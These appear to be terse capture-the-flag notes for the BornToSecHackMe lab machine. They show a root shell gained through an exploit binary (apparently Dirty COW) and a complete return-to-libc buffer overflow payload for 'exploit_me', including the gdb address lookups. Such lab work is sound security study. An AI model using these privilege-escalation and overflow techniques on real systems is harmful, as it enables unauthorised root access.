laurie@BornToSecHackMe:~$ ./exploit
[...]
Password:
root

firefart@BornToSecHackMe:/home/laurie# id
uid=0(firefart) gid=0(root) groups=0(root)

####### PUT TO README1 AFTER ########

# r $(python -c 'print "A"*139')

(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr

(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58

$(python -c 'print "A"*140+"\x60\xb0\xe6\xb7"+"\xde\xad\xbe\xef"+"\x58\xcc\xf8\xb7"')

# Final command
./exploit_me $(python -c 'print "A"*140+"\x60\xb0\xe6\xb7"+"\xde\xad\xbe\xef"+"\x58\xcc\xf8\xb7"')
